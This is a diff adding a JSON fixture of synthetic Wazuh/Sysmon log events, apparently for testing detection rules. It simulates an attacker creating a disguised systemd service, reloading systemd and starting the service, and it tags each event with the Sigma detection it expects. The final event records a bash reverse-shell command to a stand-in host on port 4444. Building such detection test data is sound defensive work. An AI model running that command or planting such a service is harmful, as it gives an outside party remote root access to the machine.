@@ -1,0 +1,264 @@
+{
+  "_metadata": {
+    "attack_id": "T1569.003",
+    "variation": "001",
+    "name": "Systemctl - Start Malicious Service",
+    "description": "Adversary uses systemctl to start a malicious systemd service",
+    "expected_detection": "HIGH",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Linux Sysmon Event 11 - Malicious service unit file creation",
+      "sequence": 1,
+      "timestamp": "2026-02-08T16:10:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T16:10:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon for Linux - Event 11: File Create",
+          "id": "100111",
+          "mitre": {
+            "id": [
+              "T1569.003",
+              "T1543.002"
+            ],
+            "tactic": [
+              "Execution",
+              "Persistence"
+            ],
+            "technique": [
+              "System Services: Systemctl",
+              "Create or Modify System Process: Systemd Service"
+            ]
+          },
+          "firedtimes": 1,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event11",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300060",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 16:10:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1569-0003-000000000001}",
+            "processId": "39012",
+            "image": "/usr/bin/vim",
+            "targetFilename": "/etc/systemd/system/system-update.service",
+            "user": "root"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1569.003",
+        "_fomorian_expected_detection": "Sigma: Systemd Service Unit Created (T1569.003)"
+      }
+    },
+    {
+      "_comment": "Linux Sysmon Event 1 - systemctl daemon-reload",
+      "sequence": 2,
+      "timestamp": "2026-02-08T16:10:30.000Z",
+      "log": {
+        "timestamp": "2026-02-08T16:10:30.000+0000",
+        "rule": {
+          "level": 8,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1569.003"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "System Services: Systemctl"
+            ]
+          },
+          "firedtimes": 2,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300061",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 16:10:30.000",
+            "processGuid": "{A1B2C3D4-EXEC-1569-0003-000000000002}",
+            "processId": "39056",
+            "image": "/usr/bin/systemctl",
+            "commandLine": "systemctl daemon-reload",
+            "currentDirectory": "/root",
+            "user": "root",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1569-0003-PARENT000001}",
+            "parentProcessId": "39000",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1569.003",
+        "_fomorian_expected_detection": "Sigma: Systemctl Daemon Reload (T1569.003)"
+      }
+    },
+    {
+      "_comment": "Linux Sysmon Event 1 - systemctl start malicious service",
+      "sequence": 3,
+      "timestamp": "2026-02-08T16:11:00.000Z",
+      "log": {
+        "timestamp": "2026-02-08T16:11:00.000+0000",
+        "rule": {
+          "level": 12,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1569.003"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "System Services: Systemctl"
+            ]
+          },
+          "firedtimes": 3,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300062",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 16:11:00.000",
+            "processGuid": "{A1B2C3D4-EXEC-1569-0003-000000000003}",
+            "processId": "39078",
+            "image": "/usr/bin/systemctl",
+            "commandLine": "systemctl start system-update.service",
+            "currentDirectory": "/root",
+            "user": "root",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1569-0003-PARENT000002}",
+            "parentProcessId": "39000",
+            "parentImage": "/bin/bash",
+            "parentCommandLine": "bash"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1569.003",
+        "_fomorian_expected_detection": "Sigma: Systemctl Start Suspicious Service (T1569.003)"
+      }
+    },
+    {
+      "_comment": "Linux Sysmon Event 1 - Malicious service spawning reverse shell",
+      "sequence": 4,
+      "timestamp": "2026-02-08T16:11:05.000Z",
+      "log": {
+        "timestamp": "2026-02-08T16:11:05.000+0000",
+        "rule": {
+          "level": 14,
+          "description": "Sysmon for Linux - Event 1: Process Create",
+          "id": "100101",
+          "mitre": {
+            "id": [
+              "T1569.003"
+            ],
+            "tactic": [
+              "Execution"
+            ],
+            "technique": [
+              "System Services: Systemctl"
+            ]
+          },
+          "firedtimes": 4,
+          "mail": false,
+          "groups": [
+            "sysmon",
+            "sysmon_event1",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "VULN01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1707400100.300063",
+        "decoder": {
+          "name": "sysmon-linux"
+        },
+        "location": "/var/log/sysmon/syslog",
+        "data": {
+          "eventdata": {
+            "utcTime": "2026-02-08 16:11:05.000",
+            "processGuid": "{A1B2C3D4-EXEC-1569-0003-000000000004}",
+            "processId": "39100",
+            "image": "/bin/bash",
+            "commandLine": "/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.110/4444 0>&1'",
+            "currentDirectory": "/",
+            "user": "root",
+            "parentProcessGuid": "{A1B2C3D4-EXEC-1569-0003-PARENT000003}",
+            "parentProcessId": "1",
+            "parentImage": "/lib/systemd/systemd",
+            "parentCommandLine": "/lib/systemd/systemd --system"
+          }
+        },
+        "_fomorian_batch": "PT-2026-003-batch2-execution",
+        "_fomorian_test": true,
+        "_fomorian_attack_id": "T1569.003",
+        "_fomorian_expected_detection": "Sigma: Systemd Service Spawning Reverse Shell (T1569.003)"
+      }
+    }
+  ]
+}
